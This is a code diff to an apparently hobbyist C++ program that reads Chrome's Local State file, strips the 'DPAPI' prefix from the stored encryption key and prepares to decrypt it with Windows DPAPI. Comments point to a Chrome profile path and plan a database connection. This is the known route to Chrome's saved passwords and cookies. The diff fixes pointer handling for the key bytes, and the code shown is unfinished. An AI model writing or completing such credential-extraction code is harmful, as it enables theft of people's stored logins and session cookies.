@@ -103,7 +103,7 @@ BYTE * GetEncryptionKey(){
     //cant rlly test yet
     printf("IN get encrpyt key \n");
     std::vector<byte> temp_key = GetLocalState();
-    BYTE * Key = (std::vector<byte>(temp_key.begin() + 5, temp_key.end())).data();
+    BYTE * Key = temp_key.data() + 5;
     //omit first 5 chars 
     printf("FIRST 5 chars: \n");
     for (int i = 0; i < 5; i++){
@@ -111,7 +111,7 @@ BYTE * GetEncryptionKey(){
     }
     printf("\nITS DPAPI\n");
     for (int j = 0;j < temp_key.size() - 5; j++){
-        putchar(temp_key[j]);
+        putchar(Key[j]);
     }
     //omg it actually works:((( im going to cry
     PDATA_BLOB blob = (PDATA_BLOB) malloc(sizeof(DATA_BLOB));
@@ -150,6 +150,6 @@ int main(){
     //CopyFiles(const_cast<char*>(temp.c_str()), const_cast<char*>(db_path.c_str())); 
    //C:\Users\Wyatt2\AppData\Local\Google\Chrome\User Data\Default"
    //create a db connection
-   GetEncryptionKey();
+   BYTE *key = GetEncryptionKey(); //omg
     
 }
